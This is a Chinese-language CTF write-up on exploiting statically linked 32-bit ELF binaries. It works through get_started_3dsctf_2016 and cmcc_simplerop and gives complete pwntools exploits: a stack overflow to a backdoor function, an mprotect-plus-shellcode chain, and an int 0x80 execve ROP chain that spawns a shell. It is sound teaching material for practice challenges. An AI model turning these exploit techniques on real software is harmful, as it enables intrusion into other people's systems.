# 静态链接程序利用

一般情况下，静态链接的程序很少出现，但是也有一些。这类 elf 的漏洞利用，主要还是依靠程序本身和用户输入。

程序本身的利用就是预留的后门函数（system）和字符串（/bin/sh）。如果有这些预留，题目难度应该不大，只要设法控制程序流到后门上。

如果没有预留的后门，很有可能是需要依靠用户输入内容结合程序本身 gadget 去构造调用，也就是手工构造 onegadget 。

正常情况下，我们会去 libc 里面找利用的函数和字符串，例如：system。但 静态链接不会到 libc 找函数，静态链接程序运行时要用到的全部东西都已经包含在 ELF 文件里，所以攻击者能利用的只有 ELF 文件的东西。ret2libc 等等攻击方法就与静态链接程序无缘。

## 实验一：get_started_3dsctf_2016

这是一条 32 位静态链接的栈溢出题目，题目在 BUU 上有实验环境。本地和远程是采用两种解决方法。

本地就是可以利用预留的后门解决，远程利用需要结合 ELF 里的一个函数——mprotect 和 用户输入内容。

### 分析

#### 保护情况

32 位只开启了 NX 

    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

#### 编译情况

这是一条静态链接的题，也就是用不到 libc 。

```shell
$ file get_started_3dsctf_2016 
get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped
```

#### 漏洞函数

main 函数里面调用了 gets 进行读取，没有对长度限制，可造成栈溢出：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [esp+4h] [ebp-38h]

  printf("Qual a palavrinha magica? ", v4);
  gets(&v4);
  return 0;
}
```

题目预留了后门函数 get_flag ，有两个判断传参的时候传进去就行了：

```c
void __cdecl get_flag(int a1, int a2)
{
  int v2; // eax
  int v3; // esi
  unsigned __int8 v4; // al
  int v5; // ecx
  unsigned __int8 v6; // al

  if ( a1 == 0x308CD64F && a2 == 0x195719D1 )
  {
    v2 = fopen("flag.txt", "rt");
    v3 = v2;
    v4 = getc(v2);
    if ( v4 != 0xFF )
    {
      v5 = (char)v4;
      do
      {
        putchar(v5);
        v6 = getc(v3);
        v5 = (char)v6;
      }
      while ( v6 != 255 );
    }
    fclose(v3);
  }
}
```

到这里的基本思路是：栈溢出控制 eip 跳转后门，也就得到了[仅栈溢出的 exp](# 仅栈溢出)，远程无法 getshell 。

### 思路

前面分析说了嘛，无法通过栈溢出跳转后门。转换一下思路，溢出空间不限。将 shellcode 写到非栈上的地方，然后用 mprotect 给内存段加上一个执行权限，在控制程序流跳转到上面。

mprotect 参数如下：

```
int mprotect(void *addr, size_t len, int prot);
addr 内存启始地址
len  修改内存的长度
prot 内存的权限
```

prot 的值为 7（rwx），重点是赋予权限的地址，要找一个有读写权限的地址，然后再给予执行权限。这里 ida 查出来的内存段权限与实际有出入，ida 里面 bss 段是有读写权限的：

![](https://mrskye.cn-gd.ufileos.com/img/2020-06-05-nNNhQnmDUVUlp9fx.png)

实际试了一下，报错修改不了。然后用 gdb 查看（指令：maintenance info sections）：

```shell
pwndbg> maintenance info sections
Exec file:
    `/home/skye/buu/get_started_3dsctf_2016/get_started_3dsctf_2016', file type elf32-i386.
 [0]     0x80480f4->0x8048114 at 0x000000f4: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS
 [1]     0x8048114->0x804818c at 0x00000114: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS
 [2]     0x804818c->0x80481af at 0x0000018c: .init ALLOC LOAD READONLY CODE HAS_CONTENTS
……
 [21]     0x80eb000->0x80eb048 at 0x000a2000: .got.plt ALLOC LOAD DATA HAS_CONTENTS
 [22]     0x80eb060->0x80ebf80 at 0x000a2060: .data ALLOC LOAD DATA HAS_CONTENTS
 [23]     0x80ebf80->0x80ecd8c at 0x000a2f80: .bss ALLOC
……
```

最后选定的将 shellcode 存放在 .got.plt 。所以需要构造出：

```python
'''
int mprotect(.got.plt地址, 够放shellcode的大小, 7);
'''
payload += p32(mprotect_addr) + p32(got_plt) + p32(0x200) + p32(0x7)
```

然后就是就是构造 read 输入 shellcode 到 .got.plt 上面，接着跳转到 .got.plt 即可：

```python
payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200)
```

实际运行后会卡在 read 函数，通过调试对比正常 read 函数，是几个寄存器的问题。在 mprotect 运行完之后，需要 pop 存放 3 个参数的寄存器，用 ROPgadget 找就行了。

read 也有 3 个参数，但是实际测试不需要 popgadget 处理，直接可以跳转就省略。

整体 payload 构造：

```python
payload = 'a'*0x38
payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7)
payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200)
```

### exp

#### 仅栈溢出

```python
from pwn import *

context.log_level = 'debug'
p = process("./get_started_3dsctf_2016")
#p = remote("node3.buuoj.cn",26536)
elf = ELF("./get_started_3dsctf_2016")

get_flag = elf.sym['get_flag']

payload = 'a'*0x38# + 'b'*0x4
payload += p32(get_flag)+p32(0xdeadbeef)+p32(0x308CD64F)+p32(0x195719D1)

#p.recvuntil("Qual")
gdb.attach(p)
p.sendline(payload)

p.interactive()
```

#### 栈溢出+mprotect

这里获取静态程序的函数地址和动态链接的有区别：

```python
elf = ELF("./get_started_3dsctf_2016")
# 若是动态链接
puts_plt = elf.plt['read']
# 若是静态链接
puts_plt = elf.sym['read']		# 方法一
puts_plt = elf.symbols['read']	# 方法二
```



```python
from pwn import *

context.log_level = 'debug'
p = process("./get_started_3dsctf_2016")
#p = remote("node3.buuoj.cn",28471)
elf = ELF("./get_started_3dsctf_2016")

pop3_ret = 0x804951D
shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux') 

mprotect_addr = elf.symbols['mprotect']
read_addr = elf.symbols['read']

got_plt = 0x80EB000

payload = 'a'*0x38
payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7)
payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200)
#payload += p32(got_plt)

gdb.attach(p)
p.sendline(payload)
p.sendline(shellcode)

p.interactive()
```

## 实验二：2017 湖湘杯 pwn300

32 位静态链接题目，需要结合用户输入的内容，然后调用 ELF 自身的 gadget 构建系统调用。

## 实验三：cmcc_simplerop

**考点：静态链接、系统调用号、栈溢出**

### 分析

#### 保护情况

32 位程序，NX 保护

```shell
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

#### 漏洞函数

main 中溢出，溢出长度挺大的：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+1Ch] [ebp-14h]

  puts("ROP is easy is'nt it ?");
  printf("Your input :");
  fflush(stdout);
  return read(0, &v4, 0x64);
}
```

### 思路

之前遇到 get_started_3dsctf_2016 的时候情况与这条题目看上去类似，用的是 mprotect  给内存添加执行权限，然后写入 shellcode 。实际操作一下这条题目，bss 、 got.plt 两个段修改不成功，最后看大佬 wp 知道用 系统调用号 。之前也做过一条题目也是用系统调用号，可以套用那个思路。

> 什么是系统调用？[维基百科](https://zh.wikipedia.org/wiki/系统调用)
>
> 系统调用号有哪些？[Linux系统调用 int 80h int 0x80](https://blog.csdn.net/xiaominthere/article/details/17287965)

就是我们最后执行这条命令：``int80(11,"/bin/sh",null,null)``。系统调用参数是读取寄存器中的（对这不是32位系统的栈传参）。

四个参数对应寄存器是：eax、ebx、ecx、edx

```python
payload = p32(pop_eax) + p32(0xb)	#系统调用号
payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(binsh_addr)
payload += p32(int_80)
```

程序中没有找到 /bin/sh\x00 字符串，所以还需要构建调用 read 函数写入字符串

```python
payload = 'a'*0x20 + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(binsh_addr) + p32(0x8)
```

### exp

```python
#encoding:utf-8
from pwn import *

context.log_level = 'debug'
p = remote('node3.buuoj.cn',29604)
#p = process("./simplerop")

int_80 = 0x80493e1
pop_eax = 0x80bae06
read_addr = 0x0806CD50
binsh_addr = 0x080EB584
pop_edx_ecx_ebx = 0x0806e850

payload = 'a'*0x20 + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(binsh_addr) + p32(0x8)
payload += p32(pop_eax) + p32(0xb)	#系统调用号
payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(binsh_addr)
payload += p32(int_80)

#gdb.attach(p)
p.sendline(payload)
p.sendline('/bin/sh\x00')
p.interactive()
```



